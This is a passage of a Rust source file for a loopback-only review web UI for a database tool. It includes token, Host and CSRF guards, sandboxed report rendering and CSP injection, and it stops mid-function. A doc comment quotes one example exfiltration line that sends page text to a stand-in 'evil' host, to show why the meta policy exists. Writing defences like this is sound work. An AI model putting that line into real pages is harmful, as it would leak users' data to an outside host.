//! Local review UI for h5i-db.
//!
//! A thin review surface, not a database GUI (DESIGN_CLAUDE.md §8-UI): its
//! job is letting a human inspect and approve what agents did or plan to do —
//! human-blocked experiment trials and mutation plans first, then warnings,
//! completed unseen work, the live fork monitor (what every agent branch is
//! doing right now, pushed over SSE), version history, snapshots, tables, and
//! an SQL scratchpad.
//!
//! Server design follows `h5i serve`: axum on loopback only, single embedded
//! HTML asset, flat `/api/*` JSON endpoints, read-only unless the process was
//! started with `--allow-mutations` (and even then every apply re-validates
//! the plan's base version — a moved HEAD is a `version_conflict`, never a
//! silent re-plan).

use std::collections::BTreeMap;
use std::path::{Path as StdPath, PathBuf};
use std::sync::Arc;
use std::time::Duration;

use axum::extract::{Path as AxPath, Query, Request, State};
use axum::http::{Method, StatusCode, header};
use axum::middleware::{self, Next};
use axum::response::sse::{Event, KeepAlive, Sse};
use axum::response::{Html, IntoResponse, Response};
use axum::routing::{get, post};
use axum::{Json, Router};
use futures::stream::Stream;
use serde::Deserialize;
use serde_json::json;
use tower::limit::ConcurrencyLimitLayer;
use tower_http::trace::TraceLayer;

use h5i_db_core::{Database, Error, MutationPlan, ReadAt};
use h5i_db_query::{H5iSession, SessionOptions};

const INDEX_HTML: &str = include_str!("../assets/index.html");
/// Rows returned to the browser per query/sample (the UI is a review
/// surface; exports belong to the CLI).
const UI_ROW_LIMIT: usize = 1_000;
/// Wall-clock budget for a scratchpad query; long exports belong to the CLI.
const UI_QUERY_TIMEOUT: Duration = Duration::from_secs(30);
/// Memory cap per scratchpad session; DataFusion spills past this.
const UI_QUERY_MEMORY_LIMIT: usize = 512 << 20;
/// Scratchpad queries running at once; extra requests queue at the route.
const UI_QUERY_CONCURRENCY: usize = 2;
/// Header required on every mutating request. Cross-origin pages cannot set
/// custom headers without a CORS preflight, and we never answer preflights.
const CSRF_HEADER: &str = "x-h5i-csrf";
/// Where rendered reports are read from, relative to the database
/// directory. Reports are written there by `python -m h5i_db.quant` or by a
/// backtest run; the UI only serves them, and only ones already on disk.
const REPORTS_SUBDIR: &str = "reports";
/// Rows read from one trial's result tables when deriving analytics. A study
/// fork holds one run, so this bounds a pathological run rather than a normal
/// one; reaching it sets `truncated` on the payload instead of quietly
/// shortening the curve.
const TRIAL_SCAN_LIMIT: usize = 50_000;
/// Points kept in a trial's equity sparkline.
const SPARKLINE_POINTS: usize = 48;
/// Nanoseconds in a Julian year, for annualising a Sharpe from sample spacing.
const YEAR_NS: f64 = 365.25 * 24.0 * 3600.0 * 1e9;
/// How often the `/api/events` stream re-derives the live frame. Frames are
/// only *sent* when the frame actually changed, so an idle database costs a
/// metadata poll per tick and no traffic.
const EVENTS_INTERVAL: Duration = Duration::from_secs(2);
/// A fork that wrote this recently is still working. Sized well above the
/// `/api/events` tick so a trial caught between two writes is never called
/// quiet.
const TRIAL_ACTIVE_WINDOW_NS: i64 = 15 * 1_000_000_000;
/// How long a started trial may stay silent before the UI stops calling it
/// live. Silence is not death: a run can spend minutes inside one scan
/// without committing anything, so this is far longer than the liveness
/// window, and what it produces is `stalled` ("started, nothing recorded,
/// quiet for a long time"), never `failed`: the server sees forks, not
/// processes, and cannot tell a crash from a long pause.
const TRIAL_STALLED_AFTER_NS: i64 = 10 * 60 * 1_000_000_000;
/// Forks `/api/experiments` derives in one request. Each costs an open, a
/// table listing and up to four bounded scans, so an unbounded study turns a
/// page load into minutes; past this the payload carries `truncated` and the
/// fork counts rather than quietly showing part of a study as all of it.
const EXPERIMENT_FORK_LIMIT: usize = 64;
/// Experiment derivations running at once; extra requests queue at the route,
/// exactly as they do for the scratchpad.
const EXPERIMENT_CONCURRENCY: usize = 2;

#[derive(Clone)]
pub struct UiState {
    pub db: Arc<Database>,
    pub allow_mutations: bool,
    pub db_label: String,
    /// Per-process bearer token; the startup URL carries it once.
    pub token: String,
    pub query_timeout: Duration,
    pub query_memory_limit: usize,
    /// Deterministic fault-injection hook for timeout tests; zero in normal
    /// construction and not exposed by the server CLI.
    #[doc(hidden)]
    pub query_start_delay: Duration,
    /// Directory holding rendered reports, when there is one.
    pub reports_dir: Option<PathBuf>,
}

impl UiState {
    /// State with a fresh random token and default query limits.
    pub fn new(db: Arc<Database>, db_label: String, allow_mutations: bool) -> Self {
        Self {
            db,
            allow_mutations,
            db_label,
            token: uuid::Uuid::new_v4().simple().to_string(),
            query_timeout: UI_QUERY_TIMEOUT,
            query_memory_limit: UI_QUERY_MEMORY_LIMIT,
            query_start_delay: Duration::ZERO,
            reports_dir: None,
        }
    }

    /// Serve rendered reports out of `dir`.
    pub fn with_reports_dir(mut self, dir: impl Into<PathBuf>) -> Self {
        self.reports_dir = Some(dir.into());
        self
    }
}

/// Serve the UI on 127.0.0.1:`port`. Never binds a non-loopback address.
pub async fn serve(
    db: Arc<Database>,
    db_label: String,
    port: u16,
    allow_mutations: bool,
) -> Result<(), Error> {
    // `db_label` is whatever the human typed on the command line and exists
    // only to be printed. Where the database actually lives is a question for
    // the backend, which answers it only for local storage: an object-store
    // database has no reports directory on this machine to serve.
    let reports = db
        .backend()
        .local_root
        .as_ref()
        .map(|root| root.join(REPORTS_SUBDIR));
    let mut state = UiState::new(db, db_label, allow_mutations);
    if let Some(dir) = reports {
        state = state.with_reports_dir(dir);
    }
    let token = state.token.clone();
    let app = build_router(state);
    let addr = std::net::SocketAddr::from(([127, 0, 0, 1], port));
    let listener = tokio::net::TcpListener::bind(addr).await.map_err(|e| {
        if e.kind() == std::io::ErrorKind::AddrInUse {
            Error::invalid(format!(
                "port {port} is already in use — pick another with `h5i-db ui --port <N>`"
            ))
        } else {
            Error::io(addr.to_string(), e)
        }
    })?;
    eprintln!("h5i-db review UI");
    eprintln!("  open   http://127.0.0.1:{port}/?token={token}");
    eprintln!(
        "         (the URL carries this session's access token — the API refuses requests without it)"
    );
    // Printed as a whole URL, token and all. `/reports` is a second document,
    // and the token it reads lives in *per-tab* sessionStorage: following the
    // review UI's own reports link works because that is the same tab, but a
    // fresh tab or a bookmark has nothing to read, and "open the URL printed at
    // startup" would only land the reader back on `/`.
    eprintln!("         rendered reports: http://127.0.0.1:{port}/reports?token={token}");
    eprintln!(
        "  mode   {}",
        if allow_mutations {
            "mutations allowed (plan apply/discard enabled)"
        } else {
            "read-only (start with --allow-mutations to approve plans)"
        }
    );
    eprintln!("  stop   Ctrl+C");
    axum::serve(listener, app)
        .await
        .map_err(|e| Error::internal(format!("server error: {e}")))
}

/// Router extracted for tests.
pub fn build_router(state: UiState) -> Router {
    Router::new()
        .route("/", get(index))
        .route("/reports", get(reports_index))
        .route("/report/{name}", get(report))
        .route("/api/reports", get(reports_list))
        .route("/api/overview", get(overview))
        // Deriving experiments opens run forks and scans them; queue extra
        // callers rather than letting a reload storm multiply that work.
        .route(
            "/api/experiments",
            get(experiments).layer(ConcurrencyLimitLayer::new(EXPERIMENT_CONCURRENCY)),
        )
        .route("/api/forks", get(forks))
        .route("/api/fork/{name}", get(fork_detail))
        .route("/api/events", get(events))
        .route("/api/table/{name}", get(table_detail))
        .route("/api/table/{name}/sample", get(table_sample))
        .route("/api/table/{name}/diff", get(version_diff))
        .route("/api/plan/{table}/{id}", get(plan_detail))
        .route("/api/plan/{table}/{id}/apply", post(plan_apply))
        .route("/api/plan/{table}/{id}/discard", post(plan_discard))
        .route(
            "/api/query",
            post(run_query).layer(ConcurrencyLimitLayer::new(UI_QUERY_CONCURRENCY)),
        )
        .layer(middleware::from_fn_with_state(state.clone(), guard))
        .layer(TraceLayer::new_for_http())
        .with_state(state)
}

async fn index() -> Html<&'static str> {
    Html(INDEX_HTML)
}

// ---------------------------------------------------------------------------
// reports: static HTML written by the quant layer, served read-only
// ---------------------------------------------------------------------------

/// Accept only a plain file name ending in `.html`.
///
/// Not a sanitiser -- a rejecter. Anything with a separator, a parent
/// reference, or an unexpected character is refused rather than cleaned up,
/// because "clean the path then trust it" is how directory traversal keeps
/// getting shipped.
fn safe_report_name(name: &str) -> Option<&str> {
    if name.is_empty() || name.len() > 128 || !name.ends_with(".html") {
        return None;
    }
    let ok = name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'));
    if !ok || name.contains("..") {
        return None;
    }
    Some(name)
}

async fn list_reports(dir: &StdPath) -> Vec<String> {
    let Ok(mut entries) = tokio::fs::read_dir(dir).await else {
        return Vec::new();
    };
    let mut names = Vec::new();
    while let Ok(Some(entry)) = entries.next_entry().await {
        // `file_type` does not follow the entry, so a symlink reads as a
        // symlink here rather than as its target. The listing must agree with
        // what `report` will actually serve, and `report` refuses symlinks.
        if !entry.file_type().await.is_ok_and(|kind| kind.is_file()) {
            continue;
        }
        let name = entry.file_name().to_string_lossy().to_string();
        if safe_report_name(&name).is_some() {
            names.push(name);
        }
    }
    // Sorted, so the listing does not depend on directory order.
    names.sort();
    names
}

async fn reports_list(State(st): State<UiState>) -> Response {
    let Some(dir) = st.reports_dir.clone() else {
        return Json(json!({ "reports": [] })).into_response();
    };
    Json(json!({ "reports": list_reports(&dir).await })).into_response()
}

/// The reports page is a shell, not a listing: it carries no report content
/// and therefore needs no token, because everything it shows comes from the
/// token-guarded `/api/reports` and `/report/{name}` routes.
///
/// That indirection is the point. A rendered report is attacker-influenceable
/// HTML (vendor market names, strategy names and config JSON all reach it), so
/// it is never a document on this origin: it is text pulled with `fetch` and
/// dropped into a `sandbox`ed iframe, which runs it in an opaque origin with
/// no reach into `sessionStorage` (where the access token lives) and no reach
/// into this page. A plain `<a href>` could not carry the bearer header
/// anyway, so the fetch is not an extra cost.
///
/// That sandbox is only half the containment, and the half that stops a report
/// *reading* this page. What stops it *sending* is the policy the server writes
/// into the report itself ([`REPORT_META_CSP`]) -- deliberately not a policy on
/// this shell, because a `sandbox` here would sandbox the shell's own scripts,
/// which are what read the token and do the fetch.
const REPORTS_SHELL: &str = r#"<!doctype html><html lang="en"><head><meta charset="utf-8">
<title>Reports</title><style>
body{font:15px/1.6 system-ui,sans-serif;margin:0;padding:24px;color:#1c1f24}
h1{font-size:18px;margin:0 0 12px}
a{color:#2a78d6;cursor:pointer}
ul{margin:0;padding-left:18px}li{margin:4px 0}
code{font-family:ui-monospace,monospace;font-size:13px}
#frame{display:block;width:100%;height:78vh;border:1px solid #d6dae0;
  border-radius:6px;margin-top:16px;background:#fff}
#frame[hidden]{display:none}
.err{color:#b3261e;font-family:ui-monospace,monospace;font-size:13px}
</style></head><body>
<h1>Reports</h1>
<div id="list"></div>
<iframe id="frame" hidden sandbox="allow-scripts" referrerpolicy="no-referrer"
        title="rendered report"></iframe>
<script>
// The token arrives once on the startup URL and is shared with the main shell
// through this origin's sessionStorage; strip it from the address bar so it
// does not survive in history or in a copied link.
const TOKEN = (() => {
  const u = new URL(location.href);
  const t = u.searchParams.get("token");
  if (t) {
    sessionStorage.setItem("h5i_token", t);
    u.searchParams.delete("token");
    history.replaceState(null, "", u.pathname + u.search + u.hash);
  }
  return sessionStorage.getItem("h5i_token") || "";
})();
const auth = { authorization: "Bearer " + TOKEN };
const list = document.getElementById("list");
const frame = document.getElementById("frame");
function fail(message) {
  const p = document.createElement("p");
  p.className = "err";
  p.textContent = message;
  list.replaceChildren(p);
}
// srcdoc, not src: the frame is sandboxed without the same-origin escape
// hatch, so the report runs in an opaque origin and cannot read this page, its
// storage or its token even if a market name smuggled a script into the
// rendered HTML. The srcdoc document inherits its policy from *this* page, not
// from the fetch response, which is why the server writes the report's CSP into
// the report's own `<head>` instead of relying on a response header no document
// is built from.
async function openReport(name) {
  const res = await fetch("/report/" + encodeURIComponent(name), { headers: auth });
  if (!res.ok) { fail("could not load " + name + " (HTTP " + res.status + ")"); return; }
  frame.srcdoc = await res.text();
  frame.hidden = false;
  location.hash = encodeURIComponent(name);
}
(async () => {
  let names = [];
  try {
    const res = await fetch("/api/reports", { headers: auth });
    if (!res.ok) {
      // The token lives in sessionStorage, which is per tab, so "reload the
      // startup URL" is the wrong advice here: it lands on `/`. Name the form
      // that actually fixes this tab.
      fail(res.status === 401
        ? "no access token for this tab: reopen as /reports?token=… "
          + "(the startup banner prints that URL), or follow the reports link "
          + "in the review UI"
        : "could not list reports (HTTP " + res.status + ")");
      return;
    }
    names = (await res.json()).reports || [];
  } catch (e) { fail(String(e)); return; }
  if (!names.length) {
    const p = document.createElement("p");
    p.textContent = "No reports yet. Render one with: python -m h5i_db.quant "
      + "tearsheet --db <db> --returns <table> --out <db>/reports/run.html";
    list.replaceChildren(p);
    return;
  }
  const ul = document.createElement("ul");
  for (const name of names) {
    // textContent, never innerHTML: a file name is data, not markup.
    const a = document.createElement("a");
    a.textContent = name;
    a.addEventListener("click", () => openReport(name));
    const li = document.createElement("li");
    li.append(a);
    ul.append(li);
  }
  list.replaceChildren(ul);
  const wanted = decodeURIComponent(location.hash.slice(1));
  if (names.includes(wanted)) openReport(wanted);
})();
</script></body></html>"#;

async fn reports_index() -> Html<&'static str> {
    Html(REPORTS_SHELL)
}

/// Content-Security-Policy *header* sent with every rendered report.
///
/// This is the navigation copy of the policy and only bites when a report
/// becomes a document from this response: `curl`, a direct open of
/// `/report/{name}`, any future `src=` embed. It is **not** what protects the
/// shell's frame. There the report is pulled with `fetch`, and a CSP header on
/// a fetch response is metadata hanging off a `Response` object that no
/// document is ever created from. That path is covered by [`REPORT_META_CSP`],
/// which travels inside the bytes.
///
/// `sandbox` without `allow-same-origin` drops the document into an opaque
/// origin: even fetched straight from this port it cannot read
/// `sessionStorage["h5i_token"]`, cannot touch a parent page, and cannot make
/// a same-origin call to `/api/plan/{table}/{id}/apply`. `allow-scripts` stays
/// because reports draw their own charts, and it has to stay in the frame's
/// `sandbox=` attribute too: when a document is under two sandboxes it gets
/// only what both allow, so dropping it from either kills every chart.
/// Everything else is denied because a report is self-contained by
/// construction (inline `<style>`, inline `<script>`, SVG built in the page,
/// no external reference and no `eval` -- see
/// `h5i_db/quant/report.py` and `basket.py`), so nothing legitimate makes a
/// network request.
const REPORT_CSP: &str = "sandbox allow-scripts; default-src 'none'; \
     script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; \
     font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'";

/// The same policy, carried *inside* the served report document.
///
/// A header protected nothing on the path reports actually take. The shell
/// pulls a report with `fetch` and assigns the text to `frame.srcdoc`; the
/// document created from `srcdoc` inherits the CSP of its **embedder**, and the
/// embedder (`/reports`) sends none, so the rendered report ran with no policy
/// at all. Sandboxing an iframe stops it *reading* cross-origin responses, not
/// *sending* requests, so with no policy on the document
/// `new Image().src = "https://evil/?" + document.body.innerText` still walks a
/// strategy's numbers out from inside the sandbox. Shipping the policy as a
/// `<meta http-equiv>` in the document's own head ends that class of gap: the
/// bytes carry their policy, so whoever parses them enforces it, and the
/// srcdoc path stops depending on response metadata nobody reads.
///
/// `sandbox` is absent on purpose. A `<meta>` policy may not carry it (nor
/// `frame-ancestors`, nor `report-uri`) and browsers drop the directive, so
/// writing it here would be theatre of exactly the kind this constant exists to
/// undo. The opaque origin comes instead from the frame's
/// `sandbox="allow-scripts"` attribute, which is a real sandbox and was the one
/// control here that ever actually ran. Every other directive must stay in step
/// with [`REPORT_CSP`]; `report_policies_stay_in_step` in `tests/api.rs` fails
/// if they drift.
const REPORT_META_CSP: &str = "<meta http-equiv=\"Content-Security-Policy\" content=\"\
     default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; \
     img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; \
     base-uri 'none'\">";

/// Byte offset just past a leading doctype, or 0 when there is not one.
///
/// Only ever used to answer "where may markup be inserted without changing how
/// the page renders". Inserting above a doctype puts the document into quirks
/// mode, which would reflow reports that render correctly today, so a doctype
/// is stepped over rather than displaced. `lower` is the ASCII-lowercased body,
/// whose byte offsets match the original because ASCII case folding is
/// one-byte-for-one-byte.
fn doctype_end(lower: &str) -> usize {
    let lead = lower.len() - lower.trim_start().len();
    if !lower[lead..].starts_with("<!doctype") {
        return 0;
    }
    lower[lead..].find('>').map_or(0, |end| lead + end + 1)
}

/// Byte offset just past the `>` closing the start tag that begins at `at`,
/// ignoring any `>` inside a quoted attribute value the way an HTML tokenizer
/// does. `None` when the tag is never closed.
fn tag_end(lower: &str, at: usize) -> Option<usize> {
    let mut quote: Option<u8> = None;
    for (offset, &byte) in lower.as_bytes()[at..].iter().enumerate() {
        match (quote, byte) {
            (Some(open), current) if current == open => quote = None,
            (Some(_), _) => {}
            (None, b'"' | b'\'') => quote = Some(byte),
            (None, b'>') => return Some(at + offset + 1),
            (None, _) => {}
        }
    }
    None
}

/// Byte offset just past the document's `<head …>` start tag, or `None`.
///
/// Two things a plain substring search gets wrong, both of which end with a
/// policy that quietly governs nothing. `<head` is a prefix of `<header>`, and
/// a body-level `<header>` in a head-less report would place the policy *below*
/// the content it exists to constrain, so the tag name has to actually end
/// there. And the closing `>` is the one outside quotes: `<head data-x="a>b">`
/// otherwise splits mid-attribute and the injected tag is swallowed as
/// attributes of `head`.
fn head_tag_end(lower: &str) -> Option<usize> {
    const HEAD: &str = "<head";
    let mut from = 0;
    while let Some(found) = lower[from..].find(HEAD) {
        let at = from + found;
        let name_ends = lower.as_bytes()[at + HEAD.len()..]
            .first()
            .copied()
            .is_none_or(|byte| matches!(byte, b'>' | b'/') || byte.is_ascii_whitespace());
        if name_ends {
            return tag_end(lower, at);
        }
        from = at + HEAD.len();
    }
    None
}

/// Put [`REPORT_META_CSP`] into a report, as the first thing a parser meets
/// inside the head.
///
/// Position is load-bearing twice. A meta policy governs only what the parser
/// reads *after* it, so it goes ahead of every other head child rather than
/// merely somewhere in the file; and browsers honour it only in the head, so a
/// head-less report (`basket.py` writes `<!doctype html><meta charset=…>` with
/// no explicit `<head>`) gets it at the top of the document instead, where the
/// parser hoists it into the head it implies. The charset declaration stays
/// well inside its 1 KiB budget behind a tag this short, and the response's own
/// `charset=utf-8` outranks it anyway.
///
/// The first real `<head` in the file is the document's own: report content is
/// written below it, into the body. And a second policy smuggled into that
/// content cannot widen this one, because a browser enforces every delivered
/// policy independently and a request must satisfy all of them -- an extra
/// policy can only subtract.
fn with_report_csp(body: &str) -> String {
    let lower = body.to_ascii_lowercase();
    // A head that could not be parsed falls back to the top of the document,
    // never to the end of it: an unreadable head is a reason to put the policy
    // first, not a reason to put it somewhere it covers nothing.
    let at = head_tag_end(&lower).unwrap_or_else(|| doctype_end(&lower));
    let mut out = String::with_capacity(body.len() + REPORT_META_CSP.len());
    out.push_str(&body[..at]);
    out.push_str(REPORT_META_CSP);
    out.push_str(&body[at..]);
    out
}

/// Read one report, refusing anything that is not a regular file sitting
/// directly inside the reports directory.
///
/// `read_to_string` follows symlinks, so a link planted in the reports
/// directory turned a name-only allowlist into "read any file this process can
/// open". `symlink_metadata` does not follow the final component, so a symlink
/// is seen as a symlink; canonicalising afterwards catches the rest (a
/// symlinked component above the file, or a name that resolves elsewhere).
async fn read_report(dir: &StdPath, safe: &str) -> Option<String> {
    let path = dir.join(safe);
    if !tokio::fs::symlink_metadata(&path)
        .await
        .is_ok_and(|meta| meta.is_file())
    {
        return None;
    }
    let root = tokio::fs::canonicalize(dir).await.ok()?;
    let real = tokio::fs::canonicalize(&path).await.ok()?;
    if real.parent() != Some(root.as_path()) {
        return None;
    }
    tokio::fs::read_to_string(&real).await.ok()
}

async fn report(State(st): State<UiState>, AxPath(name): AxPath<String>) -> Response {
    let Some(dir) = st.reports_dir.clone() else {
        return (StatusCode::NOT_FOUND, "no reports directory").into_response();
    };
    let Some(safe) = safe_report_name(&name) else {
        return (
            StatusCode::BAD_REQUEST,
            "report names are plain .html file names",
        )
            .into_response();
    };
    match read_report(&dir, safe).await {
        Some(body) => (
            [
                (header::CONTENT_TYPE, "text/html; charset=utf-8"),
                (header::CONTENT_SECURITY_POLICY, REPORT_CSP),
                (header::X_CONTENT_TYPE_OPTIONS, "nosniff"),
                (header::REFERRER_POLICY, "no-referrer"),
            ],
            // The policy goes in the body, not just the headers: the shell
            // renders reports through `srcdoc`, where response headers are
            // never consulted.
            with_report_csp(&body),
        )
            .into_response(),
        None => (StatusCode::NOT_FOUND, "no such report").into_response(),
    }
}

// ---------------------------------------------------------------------------
// request guard: Host allowlist + bearer token + CSRF header
// ---------------------------------------------------------------------------

/// Reject anything a hostile web page could make a browser send here: DNS
/// rebinding arrives with a foreign `Host`; cross-site requests cannot carry
/// the bearer token (never issued cross-origin) or a custom header.
async fn guard(State(st): State<UiState>, req: Request, next: Next) -> Response {
    let host_ok = req
        .headers()
        .get(header::HOST)
        .and_then(|h| h.to_str().ok())
        .is_some_and(host_is_loopback);
    if !host_ok {
        return guard_reject(
            StatusCode::FORBIDDEN,
            "forbidden_host",
            "request Host is not a loopback name",
            "the review UI only answers to localhost / 127.0.0.1 / [::1]",
        );
    }
    if requires_token(req.uri().path()) {
        let authed = req
            .headers()
            .get(header::AUTHORIZATION)
            .and_then(|h| h.to_str().ok())
            .and_then(|v| v.strip_prefix("Bearer "))
            .is_some_and(|t| token_eq(t, &st.token));
        if !authed {
            return guard_reject(
                StatusCode::UNAUTHORIZED,
                "unauthorized",
                "missing or wrong access token",
                "open the UI through the exact URL printed at startup — it carries the token",
            );
        }
        if req.method() == Method::POST && !req.headers().contains_key(CSRF_HEADER) {
            return guard_reject(
                StatusCode::FORBIDDEN,
                "csrf_required",
                "mutating request without the CSRF header",
                "send `x-h5i-csrf: 1` on POST requests",
            );
        }
    }
    next.run(req).await
}

/// Routes that may not be answered without the bearer token.
///
/// `/api/` is the JSON surface. `/report/` is here because a rendered report
/// is not public data: it is the output of somebody's strategy, and it was
/// readable by any other process on the machine that could guess a file name.
/// Note the trailing slash, which keeps `/reports` out: that route is an empty
/// shell, and giving it a token requirement would only break it, since a
/// browser cannot put an `Authorization` header on a top-level navigation.
fn requires_token(path: &str) -> bool {
    path.starts_with("/api/") || path.starts_with("/report/")
}

fn guard_reject(status: StatusCode, code: &str, message: &str, hint: &str) -> Response {
    let body = json!({"code": code, "message": message, "retryable": false, "hint": hint});
    (status, Json(body)).into_response()
}

/// `Host` allowlist (port ignored): loopback names only.
fn host_is_loopback(host: &str) -> bool {
    let h = host.trim();
    let bare = if let Some(rest) = h.strip_prefix('[') {
        match rest.split_once(']') {
            Some((ip, _)) => ip,
            None => return false,
        }
    } else {
        match h.rsplit_once(':') {
            Some((name, port)) if !port.is_empty() && port.bytes().all(|b| b.is_ascii_digit()) => {
                name
            }
            _ => h,
        }
    };
    matches!(
        bare.to_ascii_lowercase().as_str(),
        "localhost" | "127.0.0.1" | "::1"
    )
}

/// Constant-time-ish comparison; enough to blunt timing probes on loopback.
fn token_eq(a: &str, b: &str) -> bool {
    a.len() == b.len()
        && a.bytes()
            .zip(b.bytes())
            .fold(0u8, |acc, (x, y)| acc | (x ^ y))
            == 0
}

// ---------------------------------------------------------------------------
// error envelope (same contract as the CLI)
// ---------------------------------------------------------------------------

enum ApiError {
    Db(Error),
    /// Envelope not backed by a core error (e.g. scratchpad timeout).
    Custom {
        status: StatusCode,
        code: &'static str,
        message: String,
        hint: &'static str,
    },
}

impl IntoResponse for ApiError {
    fn into_response(self) -> Response {
        match self {
            ApiError::Db(e) => {
                let status = match e.exit_category() {
                    h5i_db_core::ExitCategory::UserError => StatusCode::BAD_REQUEST,
                    h5i_db_core::ExitCategory::Conflict => StatusCode::CONFLICT,
                    h5i_db_core::ExitCategory::Limit => StatusCode::TOO_MANY_REQUESTS,
                    _ => StatusCode::INTERNAL_SERVER_ERROR,
                };
                let body = json!({
                    "code": e.code(),
                    "message": e.to_string(),
                    "retryable": e.retryable(),
                    "hint": e.hint(),
                });
                (status, Json(body)).into_response()
            }
            ApiError::Custom {
                status,
                code,
                message,
                hint,
            } => {
                let body =
                    json!({"code": code, "message": message, "retryable": false, "hint": hint});
                (status, Json(body)).into_response()
            }
        }
    }
}

impl From<Error> for ApiError {
    fn from(e: Error) -> Self {
        Self::Db(e)
    }
}

type ApiResult = Result<Json<serde_json::Value>, ApiError>;

// ---------------------------------------------------------------------------
// handlers
// ---------------------------------------------------------------------------

/// The live projection shared by `/api/overview` and the `/api/events`
/// stream: everything that changes while agents work — tables, pending
/// plans, forks — but none of the slow-moving extras (policy, snapshots).
async fn live_frame(st: &UiState) -> Result<serde_json::Value, Error> {
    let mut tables = Vec::new();
    let mut plans = Vec::new();
    for entry in st.db.list_tables().await? {
        let resolved = st.db.resolve(&entry.name, ReadAt::Latest).await?;
        let head = resolved.head_sequence;
        tables.push(json!({
            "name": entry.name,
            "version": resolved.manifest.sequence,
            "rows": resolved.manifest.rows,
            "bytes": resolved.manifest.bytes,
            "segments": resolved.manifest.segments.len(),
            "time_range": resolved.manifest.time_range,
            "time_column": resolved.spec.time_column,
            "committed_at_ns": resolved.manifest.committed_at_ns,
            "op": resolved.manifest.op.to_string(),
            "execution_mode": resolved.manifest.execution_mode,
        }));
        for plan in st.db.list_plans(&entry.name).await? {
            plans.push(plan_summary_json(&plan, head));
        }
    }
    let forks = st.db.list_forks().await?;
    Ok(json!({
        "db": st.db_label,
        "fork": st.db.fork_name(),
        "allow_mutations": st.allow_mutations,
        "plans": plans,
        "tables": tables,
        "forks": forks,
    }))
}

/// The core triage projection: pending plans, tables, forks, snapshots,
/// policy, and mode. Experiment trials have their own projection because
/// deriving them opens run forks and should not delay the live metadata frame.
async fn overview(State(st): State<UiState>) -> ApiResult {
    let mut out = live_frame(&st).await?;
    let snapshots: Vec<_> = st
        .db
        .list_snapshots()
        .await?
        .iter()
        .map(|s| {
            json!({
                "name": s.name,
                "created_at_ns": s.created_at_ns,
                "note": s.note,
                "tables": s.entries.values().map(|e| json!({
                    "table": e.table_name, "version": e.sequence,
                })).collect::<Vec<_>>(),
            })
        })
        .collect();
    out["read_only_db"] = json!(st.db.is_read_only());
    out["policy"] = serde_json::to_value(st.db.policy().await?).map_err(Error::from)?;
    out["snapshots"] = json!(snapshots);
    Ok(Json(out))
}

/// Agent-native experiment projection, derived from the run forks themselves.
///
/// A score is never copied into a second UI-owned object: `bt_config` supplies
/// experiment identity and `bt_run` supplies the recorded result. Forks which
/// have started but do not yet contain `bt_run` remain visible as running (or
/// stalled once they have been quiet a long time), so attention routing does
/// not depend on a successful run.
///
/// Bounded on purpose. Every fork here costs an open, a table listing and up
/// to four scans, so a study with hundreds of trials would make this endpoint
/// take minutes. Only the most recently created `EXPERIMENT_FORK_LIMIT` forks
/// are derived, and the payload says so: a truncated leaderboard that admits
/// it is a triage surface, a silently short one is a lie.
async fn experiments(State(st): State<UiState>) -> ApiResult {
    let mut grouped: BTreeMap<String, Vec<serde_json::Value>> = BTreeMap::new();
    let now_ns = chrono::Utc::now().timestamp_nanos_opt().unwrap_or_default();
    let mut summaries: Vec<_> = st
        .db
        .list_forks()
        .await?
        .into_iter()
        .filter(|fork| fork.name.starts_with("bt-"))
        .collect();
    let forks_total = summaries.len();
    // Newest first, because the runs a human is triaging are the recent ones.
    summaries.sort_by_key(|summary| std::cmp::Reverse(summary.created_at_ns));
    summaries.truncate(EXPERIMENT_FORK_LIMIT);
    let forks_scanned = summaries.len();
    for summary in summaries {
        let fork = st.db.base().open_fork(&summary.name).await?;
        let tables: Vec<String> = fork
            .list_tables()
            .await?
            .into_iter()
            .map(|entry| entry.name)
            .collect();
        let config = if tables.iter().any(|name| name == "bt_config") {
            scan_first_object(&fork, "bt_config").await?
        } else {
            None
        };
        let report = if tables.iter().any(|name| name == "bt_run") {
            scan_first_object(&fork, "bt_run").await?
        } else {
            None
        };

        let config_json = config
            .as_ref()
            .and_then(|row| row.get("config_json"))
            .and_then(serde_json::Value::as_str)
            .and_then(|text| serde_json::from_str::<serde_json::Value>(text).ok());
        let metadata = config_json
            .as_ref()
            .and_then(|value| value.get("metadata"))
            .and_then(serde_json::Value::as_object);
        let run_id = report
            .as_ref()
            .and_then(|row| row.get("run_id"))
            .and_then(serde_json::Value::as_str)
            .map(str::to_owned)
            .or_else(|| {
                config
                    .as_ref()
                    .and_then(|row| row.get("run_id"))
                    .and_then(serde_json::Value::as_str)
                    .map(str::to_owned)
            })
            .or_else(|| {
                summary
                    .note
                    .as_deref()
                    .and_then(|note| note.strip_prefix("backtest run "))
                    .map(str::to_owned)
            })
            .unwrap_or_else(|| summary.name.trim_start_matches("bt-").to_string());
        let inferred = infer_study_trial(&run_id);
        let study_id = metadata
            .and_then(|meta| meta.get("study_id"))
            .and_then(serde_json::Value::as_str)
            .map(str::to_owned)
            .or_else(|| inferred.as_ref().map(|value| value.0.clone()))
            .unwrap_or_else(|| "individual runs".to_string());
        let trial = metadata
            .and_then(|meta| meta.get("trial"))
            .cloned()
            .or_else(|| inferred.as_ref().map(|value| json!(value.1)));
        let phase = metadata
            .and_then(|meta| meta.get("phase"))
            .and_then(serde_json::Value::as_str)
            .map(str::to_owned)
            .or_else(|| inferred.as_ref().map(|value| value.2.clone()));
        let parameters = metadata
            .and_then(|meta| meta.get("parameters"))
            .cloned()
            .unwrap_or(serde_json::Value::Null);
        let needs_decision = metadata
            .and_then(|meta| meta.get("needs_decision"))
            .and_then(serde_json::Value::as_bool)
            .unwrap_or(false);
        let warnings: Vec<String> = report
            .as_ref()
            .and_then(|row| row.get("warnings"))
            .and_then(serde_json::Value::as_str)
            .map(|text| {
                text.split("; ")
                    .filter(|warning| !warning.is_empty())
                    .map(str::to_owned)
                    .collect()
            })
            .unwrap_or_default();
        let last_activity = summary.last_write_ns.unwrap_or(summary.created_at_ns);
        let quiet_ns = now_ns.saturating_sub(last_activity);
        // A fork that has not written is not a fork that died. A run can sit
        // inside one long scan without committing anything, so short silence
        // is `idle` (started, nothing recorded yet) and only a long silence
        // becomes `stalled`. Neither claims a failure the server cannot see:
        // it observes fork metadata, not processes.
